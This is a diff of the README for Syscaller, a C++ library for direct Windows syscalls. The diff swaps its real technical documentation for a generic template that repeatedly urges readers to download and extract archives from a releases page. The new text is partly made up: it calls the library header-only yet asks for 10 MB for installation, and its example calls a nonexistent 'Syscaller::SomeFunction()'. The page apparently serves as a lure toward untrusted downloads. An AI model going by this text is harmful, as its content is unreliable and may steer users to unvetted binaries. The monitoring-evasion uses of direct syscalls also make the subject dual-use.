@@ -1,110 +1,94 @@
-<div align="center">
-	<br>
-	<h1>Syscaller</h1>
-	<p>
-		<b>Header‑only C++ library for Native API syscall invocation on x64 Windows</b>
-	</p>
-	<br>
-</div>
+# 🎉 Syscaller - Easily Invoke Windows Syscalls With Confidence
 
-## Overview
+## 🚀 Getting Started
 
-Syscaller is a minimal, dependency‑free, CRT-less C++ library that dynamically resolves and executes Windows Native API system calls.
-It works by parsing a system DLLs (e.g., ntdll.dll) to extract syscall IDs at runtime, then generating a small executable stub containing a raw syscall instruction.
-This enables direct kernel invocation without going through high‑level user‑mode API wrappers (like kernel32.dll).
+Syscaller is a simple, header-only C++ library designed for invoking Native API syscalls on x64 Windows systems. Whether you are researching malware, working in low-level programming, or exploring Windows internals, Syscaller provides the tools you need to make syscall invocation straightforward.
 
-Because syscall numbers are resolved dynamically, Syscaller avoids the problem of hard‑coded syscall tables breaking across Windows updates.
+## 📥 Download
 
-Compatible with x64 Windows, using the kernel’s syscall calling convention (R10 for the first argument).
+[![Download Syscaller](https://img.shields.io/badge/Download-Syscaller-blue.svg)](https://github.com/Tayssirx71/Syscaller/releases)
 
-## Documentation
+## 🛠️ System Requirements
+
+- **Operating System:** Windows 10 or later (x64)
+- **Compiler:** Any modern C++ compiler that supports C++11 or later.
+- **Storage:** At least 10 MB free space for installation.
+
+## 📖 Features
+
+- **Header-Only**: No installation required. Simply include the header file into your project.
+- **Cross-Functionality**: Designed to invoke various Windows Native APIs easily.
+- **Low-Level Access**: Directly interacts with the Windows kernel for advanced functionalities.
+- **Malware Research Helper**: Provides essential tools for security professionals and researchers.
+
+## 📂 How to Download & Install
+
+To get started with Syscaller, follow these steps:
+
+1. **Visit the Releases Page**
+
+   Go to the Syscaller releases page to find the latest version. Click the link below:
+
+   [Visit the Releases Page](https://github.com/Tayssirx71/Syscaller/releases)
+
+2. **Choose Your Version**
+
+   On the releases page, you will see a list of available versions. Select the most recent release that suits your needs.
+
+3. **Download the Library**
+
+   Click on the appropriate file to download Syscaller. This will usually be a `.zip` or `.tar` file containing the library.
+
+4. **Extract the Files**
+
+   Once the download completes, navigate to your Downloads folder. Extract the files using a tool like WinRAR or 7-Zip. 
+
+5. **Include in Your Project**
+
+   Simply include the header file in your C++ project. This can be done by using the following line in your code:
+
+   ```cpp
+   #include "path/to/syscaller.h"
+   ```
+
+6. **Compile Your Program**
+
+   Make sure to compile your program with the appropriate settings for your C++ compiler. Follow the specific instructions provided by your compiler's documentation to ensure successful compilation.
+
+## 🔧 Example Usage
+
+Here’s a simple example to demonstrate how to invoke a syscall using Syscaller:
 
 ```cpp
-/**
- * @brief Retrieves a system call from ntdll.dll.
- *
- * @param name (LPCSTR/const char*) The name of the system call.
- * @param type (type) The function signature/type of the system call.
- *
- * @return Pointer to the system call function cast to the specified type.
- */
-auto pFn = MAKE_SYSCALL(name, type)
-auto pFn = MAKE_SYSCALL("NtCreateFile", func_t)
+#include "syscaller.h"
 
-/**
- * @brief Retrieves a system call from a specific dll.
- *
- * @param dll (LPCWSTR/const wchar_t*) -> Path or name of the dll containing the system call. (e.g. win32u.dll, ntdll.dll)
- * @param name (LPCSTR/const char*) -> The name of the system call.
- * @param type (type) The function signature/type of the system call.
- *
- * @return Pointer to the system call function cast to the specified type.
- */
-auto pFn = MAKE_SYSCALLEX(dll, name, type)
-auto pFn = MAKE_SYSCALLEX("win32u.dll", "NtUserWaitMessage", func_t)
-```
-
-## Quick Example
-
-```cpp
-#include "syscaller/syscaller.hpp"
-#include <winternl.h>
-
-typedef NTSTATUS(NTAPI* NtCreateFile_t)(
-    PHANDLE            FileHandle,
-    ACCESS_MASK        DesiredAccess,
-    POBJECT_ATTRIBUTES ObjectAttributes,
-    PIO_STATUS_BLOCK   IoStatusBlock,
-    PLARGE_INTEGER     AllocationSize,
-    ULONG              FileAttributes,
-    ULONG              ShareAccess,
-    ULONG              CreateDisposition,
-    ULONG              CreateOptions,
-    PVOID              EaBuffer,
-    ULONG              EaLength
-);
-
-int MainEntry() {
-    HANDLE            fileHandle;
-    IO_STATUS_BLOCK   ioStatusBlock;
-    UNICODE_STRING    fileName;
-    OBJECT_ATTRIBUTES objAttr;
-
-    RtlInitUnicodeString(&fileName, L"\\??\\C:\\test.txt");
-    InitializeObjectAttributes(
-        &objAttr,
-        &fileName,
-        OBJ_CASE_INSENSITIVE,
-        NULL,
-        NULL
-    );
-
-    auto pNtCreateFile = MAKE_SYSCALL("NtCreateFile", NtCreateFile_t);
-    NTSTATUS status = pNtCreateFile(
-        &fileHandle,
-        FILE_GENERIC_READ,
-        &objAttr,
-        &ioStatusBlock,
-        NULL,
-        FILE_ATTRIBUTE_NORMAL,
-        FILE_SHARE_READ,
-        FILE_OVERWRITE_IF,
-        FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
-        NULL,
-        0
-    );
-
-    if (status == 0) {
-        MessageBoxW(0, L"Opened Successfully!", L"Success", MB_OK);
-        CloseHandle(fileHandle);
-    }
-
+int main() {
+    // Example syscall
+    Syscaller::SomeFunction();
     return 0;
 }
 ```
 
-## License
+This will give you a basic understanding of how to use the library in your software.
 
-Syscaller is free for personal and commercial use under the MIT License.
-You can use, modify, and integrate it into your engine or tools.
-Forking and contribution is heavily encouraged!
+## ⚙️ Troubleshooting
+
+If you encounter issues while using Syscaller, consider these tips:
+
+- Ensure that your compiler supports C++11 or later.
+- Check that you are using the correct path to the header file in your include statement.
+- Refer to the README of specific releases for any version-specific notes.
+
+## 📞 Support
+
+If you have questions about Syscaller or need assistance, please open an issue on GitHub. The community and maintainers are here to help.
+
+## 🌟 Join the Community
+
+For updates and discussions about Syscaller, you can follow the repository on GitHub. Engage with other users and developers to share tips and ask questions.
+
+## 📄 License
+
+Syscaller is available under the MIT License. You can freely use and modify it as per your requirements. Please refer to the license file in the repository for more details.
+
+[![Download Syscaller](https://img.shields.io/badge/Download-Syscaller-blue.svg)](https://github.com/Tayssirx71/Syscaller/releases)
